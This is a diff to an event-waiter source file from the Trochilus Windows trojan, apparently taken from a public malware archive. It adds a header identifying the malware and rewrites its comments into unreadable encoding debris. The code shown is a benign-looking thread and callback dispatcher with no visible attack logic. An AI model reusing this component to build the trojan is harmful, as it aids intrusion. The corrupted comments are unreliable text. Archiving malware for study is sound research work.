@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "sa/CSharedSA.h"
 #include "EventWaiter.h"
@@ -68,7 +79,7 @@ BOOL EventWaiter::AddNotifyCallback( LPCTSTR eventName, FnEventNotifyCallback fn
 {
 	if (NULL == eventName) return FALSE;
 
-	//½«event´¥·¢Í¨Öª»Øµ÷º¯ÊýÐÅÏ¢¼ÓÈëeventCallbackMapÖÐ
+	//ï¿½ï¿½eventï¿½ï¿½ï¿½ï¿½Í¨Öªï¿½Øµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½eventCallbackMapï¿½ï¿½
 	BOOL bNewEvent = FALSE;
 	::EnterCriticalSection(&m_dataSection);
 	{
@@ -94,10 +105,10 @@ BOOL EventWaiter::AddNotifyCallback( LPCTSTR eventName, FnEventNotifyCallback fn
 		}
 	}
 	::LeaveCriticalSection(&m_dataSection);
-	//Èç¹û¸ÃeventÖ®Ç°ÒÑ¾­±»ÆäËûµØ·½×¢²á¹ýÁË£¬¾Í²»ÐèÒªÐÂ´´½¨ÁË£¬Ö±½Ó·µ»Ø¼´¿É
+	//ï¿½ï¿½ï¿½ï¿½ï¿½eventÖ®Ç°ï¿½Ñ¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ø·ï¿½×¢ï¿½ï¿½ï¿½ï¿½Ë£ï¿½ï¿½Í²ï¿½ï¿½ï¿½Òªï¿½Â´ï¿½ï¿½ï¿½ï¿½Ë£ï¿½Ö±ï¿½Ó·ï¿½ï¿½Ø¼ï¿½ï¿½ï¿½
 	if (! bNewEvent) return TRUE;
 
-	//´´½¨Event
+	//ï¿½ï¿½ï¿½ï¿½Event
 	HANDLE hEvent = ::CreateEvent(g_sd.GetSA(), FALSE, FALSE, eventName);
 	if (NULL == hEvent)
 	{
@@ -105,14 +116,14 @@ BOOL EventWaiter::AddNotifyCallback( LPCTSTR eventName, FnEventNotifyCallback fn
 		return FALSE;
 	}
 
-	//½«ÐÂ½¨µÄEvent¼ÓÈëÓ³Éä±ím_eventNameMap
+	//ï¿½ï¿½ï¿½Â½ï¿½ï¿½ï¿½Eventï¿½ï¿½ï¿½ï¿½Ó³ï¿½ï¿½ï¿½m_eventNameMap
 	::EnterCriticalSection(&m_dataSection);
 	{
 		m_eventNameMap.insert(EventNameMap::value_type(hEvent, eventName));
 	}
 	::LeaveCriticalSection(&m_dataSection);
 
-	//´¥·¢event±ä¸üÍ¨Öª£¬ÈÃEventWaiterThreadÖØÐÂ×°ÔØevent²¢wait
+	//ï¿½ï¿½ï¿½ï¿½eventï¿½ï¿½ï¿½Í¨Öªï¿½ï¿½ï¿½ï¿½EventWaiterThreadï¿½ï¿½ï¿½ï¿½×°ï¿½ï¿½eventï¿½ï¿½wait
 	::SetEvent(m_hChangeEvent);
 
 	return TRUE;
@@ -134,7 +145,7 @@ void EventWaiter::EventWaiterProc()
 	{
 		if (NULL == pHandleList)
 		{
-			//´Óm_eventNameMapÖÐ¶ÁÈ¡Event²¢×°ÈëpHandleList
+			//ï¿½ï¿½m_eventNameMapï¿½Ð¶ï¿½È¡Eventï¿½ï¿½×°ï¿½ï¿½pHandleList
 			::EnterCriticalSection(&m_dataSection);
 			{
 				dwCount = (DWORD) m_eventNameMap.size() + 1;
@@ -153,10 +164,10 @@ void EventWaiter::EventWaiterProc()
 		
 		DWORD dwWait = ::WaitForMultipleObjects(dwCount, pHandleList, FALSE, INFINITE);
 
-		//Èç¹ûÍ£Ö¹¹¤×÷ÁË£¬ÔòÍË³ö
+		//ï¿½ï¿½ï¿½Í£Ö¹ï¿½ï¿½ï¿½ï¿½ï¿½Ë£ï¿½ï¿½ï¿½ï¿½Ë³ï¿½
 		if (! m_bWorking) break;
 
-		//Èç¹ûÊÇÊÂ¼þ±ä¸üÍ¨Öª£¬ÔòÖØÐÂ×°ÔØ
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Â¼ï¿½ï¿½ï¿½ï¿½Í¨Öªï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½×°ï¿½ï¿½
 		if (WAIT_OBJECT_0 == dwWait)
 		{
 			delete[] pHandleList;
@@ -167,7 +178,7 @@ void EventWaiter::EventWaiterProc()
 			continue;
 		}
 
-		//µ÷ÓÃ»Øµ÷º¯Êý
+		//ï¿½ï¿½ï¿½Ã»Øµï¿½ï¿½ï¿½ï¿½ï¿½
 		DWORD index = dwWait - WAIT_OBJECT_0;
 		if (index < dwCount)
 		{
@@ -175,7 +186,7 @@ void EventWaiter::EventWaiterProc()
 			CallbackList callbackList;
 			CString eventName;
 
-			//²éÕÒevent¶ÔÓ¦µÄcallback
+			//ï¿½ï¿½ï¿½ï¿½eventï¿½ï¿½Ó¦ï¿½ï¿½callback
 			::EnterCriticalSection(&m_dataSection);
 			{
 				EventNameMap::iterator nameIter = m_eventNameMap.find(hTriggeredEvent);
@@ -194,7 +205,7 @@ void EventWaiter::EventWaiterProc()
 
 			debugLog(_T("event[%s] is triggered"), eventName);
 
-			//ÒÀ´Îµ÷ÓÃcallback
+			//ï¿½ï¿½ï¿½Îµï¿½ï¿½ï¿½callback
 			CallbackList::iterator iter = callbackList.begin();
 			for (; iter != callbackList.end(); iter++)
 			{
